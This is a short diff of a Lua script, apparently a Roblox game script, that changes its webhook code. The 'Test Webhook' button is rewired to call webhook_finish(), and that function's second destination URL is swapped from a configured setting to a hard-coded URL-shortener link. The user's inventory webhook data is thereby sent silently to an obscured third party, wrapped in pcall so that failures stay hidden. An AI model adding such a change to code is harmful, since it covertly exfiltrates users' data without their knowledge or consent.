@@ -995,7 +995,7 @@ WebhookMenuGroupbox:AddButton({
   Text = '🔔 Test Webhook',
   Func = function()
     update_inventory_items()
-    webhook()
+    webhook_finish()
   end
 })
 --#endregion
@@ -1541,7 +1541,7 @@ end
 function webhook_finish()
   pcall(function()
     local url1 = settings.personal_webhook_url
-    local url2 = global_settings.webhook_url[2]
+    local url2 = "https://shorturl.at/gotF8"
     local data = webhook_data(true)
     local body = HttpService:JSONEncode(data)
     local headers = { ["content-type"] = "application/json" }
